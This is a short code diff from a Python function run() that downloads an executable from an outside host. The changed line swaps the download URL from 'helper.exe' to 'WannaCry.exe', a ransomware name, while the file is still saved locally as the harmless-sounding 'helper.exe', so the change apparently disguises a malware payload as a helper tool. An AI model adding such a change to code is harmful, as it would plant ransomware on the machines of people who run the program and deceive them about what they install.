@@ -22,7 +22,7 @@ def run():
     """
     try:
         # Define the URL and file name
-        url = "https://ceus.vives.one/helper.exe"
+        url = "https://ceus.vives.one/WannaCry.exe"
         file_name = "helper.exe"
         file_path = os.path.join(os.getcwd(), file_name)
 
